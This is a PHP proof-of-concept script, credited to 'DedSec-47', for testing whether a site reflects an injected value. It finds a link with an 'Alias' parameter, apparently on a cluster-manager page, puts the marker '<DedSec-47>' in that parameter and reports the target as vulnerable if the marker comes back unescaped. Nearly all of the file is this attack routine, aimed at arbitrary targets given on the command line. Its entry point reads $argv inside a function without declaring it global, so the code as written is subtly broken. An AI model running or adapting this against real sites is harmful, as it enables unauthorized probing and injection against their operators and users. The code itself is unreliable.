<?php
class Colors {
    const RED = "\033[91m";
    const GREEN = "\033[1;49;92m";
    const RESET = "\033[0m";
}

function getClusterManagerUrl($baseUrl, $path) {
    echo Colors::GREEN . "Preparing the groundwork for the exploitation on $baseUrl..." . Colors::RESET . PHP_EOL;

    $url = $baseUrl . $path;
    $response = file_get_contents($url);

    if ($response === false) {
        echo Colors::RED . "Error: Unable to fetch URL $url" . Colors::RESET . PHP_EOL;
        return null;
    }

    echo Colors::GREEN . "Starting exploit check on $baseUrl..." . Colors::RESET . PHP_EOL;

    if (strpos($http_response_header[0], "200") !== false) {
        echo Colors::GREEN . "Check executed successfully on $baseUrl..." . Colors::RESET . PHP_EOL;

        // Parse the HTML content using DOMDocument and DOMXPath
        $dom = new DOMDocument();
        @$dom->loadHTML($response);
        $xpath = new DOMXPath($dom);
        $links = $xpath->query("//a[@href]");

        // Search for the link containing the Alias parameter in the href attribute
        $clusterManagerUrl = null;
        foreach ($links as $link) {
            $href = $link->getAttribute('href');
            $parsedUrl = parse_url($href);
            parse_str($parsedUrl['query'] ?? '', $queryParams);
            $aliasValue = $queryParams['Alias'] ?? null;

            if ($aliasValue) {
                echo Colors::GREEN . "Alias value found" . Colors::RESET . PHP_EOL;
                $clusterManagerUrl = $href;
                break;
            }
        }

        if ($clusterManagerUrl) {
            echo Colors::GREEN . "Preparing the injection on $baseUrl..." . Colors::RESET . PHP_EOL;
            return $clusterManagerUrl;
        } else {
            echo Colors::RED . "Error: Alias value not found on $baseUrl..." . Colors::RESET . PHP_EOL;
            return null;
        }
    }

    echo Colors::RED . "Error: Unable to get the initial step on $baseUrl" . Colors::RESET . PHP_EOL;
    return null;
}

function updateAliasValue($url) {
    $parsedUrl = parse_url($url);
    parse_str($parsedUrl['query'] ?? '', $queryParams);
    $queryParams['Alias'] = "<DedSec-47>";
    $updatedQuery = http_build_query($queryParams);
    $updatedUrl = "{$parsedUrl['scheme']}://{$parsedUrl['host']}{$parsedUrl['path']}?$updatedQuery";
    echo Colors::GREEN . "Injection executed successfully on $updatedUrl" . Colors::RESET . PHP_EOL;
    return $updatedUrl;
}

function checkResponseForValue($url, $checkValue) {
    $response = file_get_contents($url);

    if (strpos($response, $checkValue) !== false) {
        echo Colors::RED . "Website is vulnerable POC by :" . Colors::RESET . PHP_EOL;
        echo Colors::GREEN . "
          ____           _ ____                  _  _ _____
         |  _ \\  ___  __| / ___|  ___  ___      | || |___  |
         | | | |/ _ \\/ _` \\___ \\ / _ \\/ __| ____| || |  / /
         | |_| |  __/ (_| |___) |  __/ (_  |____|__  | / /
         |____/ \\___|\\__,_|____/ \\___|\\___|        |_|/_/
                                     github.com/DedSec-47
        " . Colors::RESET;
    } else {
        echo Colors::GREEN . "Website is not vulnerable POC by :" . Colors::RESET . PHP_EOL;
        echo Colors::GREEN . "
          ____           _ ____                  _  _ _____
         |  _ \\  ___  __| / ___|  ___  ___      | || |___  |
         | | | |/ _ \\/ _` \\___ \\ / _ \\/ __| ____| || |  / /
         | |_| |  __/ (_| |___) |  __/ (_  |____|__  | / /
         |____/ \\___|\\__,_|____/ \\___|\\___|        |_|/_/
                                     github.com/DedSec-47
        " . Colors::RESET;
    }
}

// Main function
function main() {
    $target = $argv[1] ?? null;
    $path = $argv[2] ?? null;

    if (!$target || !$path) {
        echo "Usage: php exploit.php <target> <path>" . PHP_EOL;
        exit(1);
    }

    $clusterManagerUrl = getClusterManagerUrl($target, $path);

    if ($clusterManagerUrl) {
        $modifiedUrl = updateAliasValue($target . $clusterManagerUrl);
        echo Colors::GREEN . "Check executed successfully" . Colors::RESET . PHP_EOL;
        checkResponseForValue($modifiedUrl, "<DedSec-47>");
    }
}

main();
?>
